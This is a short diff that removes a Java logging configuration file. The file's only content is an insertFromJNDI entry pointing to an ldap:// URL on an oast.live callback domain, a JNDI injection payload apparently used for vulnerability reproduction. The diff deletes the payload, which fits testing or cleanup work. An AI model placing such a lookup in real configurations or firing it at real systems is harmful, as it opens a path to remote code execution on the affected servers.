@@ -1,3 +1,1 @@
-<configuration>
-  <insertFromJNDI env-entry-name="ldap://repro2.d9c66rjoilb2d39sugn0gqsun8c7cxnjq.oast.live/a" as="foo" />
-</configuration>
+
